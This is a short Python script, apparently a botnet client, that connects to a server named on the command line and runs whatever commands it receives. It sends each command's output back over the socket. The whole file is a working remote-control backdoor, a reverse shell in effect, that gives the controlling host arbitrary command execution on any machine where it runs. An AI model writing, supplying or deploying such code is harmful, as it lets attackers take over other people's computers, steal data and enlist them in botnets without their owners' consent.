import sys
from subprocess import Popen, PIPE
from socket import *

# Server details
if len(sys.argv) != 2:
    print("Usage: python bot.py <server_name>")
    sys.exit(1)

server_name = sys.argv[1]
server_port = 8000

# Create an IPv4 TCP socket
client_socket = socket(AF_INET, SOCK_STREAM)
client_socket.connect((server_name, server_port))

# Notify the server that the bot is ready
client_socket.send('Bot reporting for duty'.encode())

# Receive and execute commands
command = client_socket.recv(4064).decode()
while command != "exit":
    # Execute the command
    proc = Popen(command.split(" "), stdout=PIPE, stderr=PIPE)
    result, err = proc.communicate()
    
    # Send the output back to the server
    client_socket.send(result if result else err)
    
    # Wait for the next command
    command = client_socket.recv(4064).decode()

# Close the connection
client_socket.close()
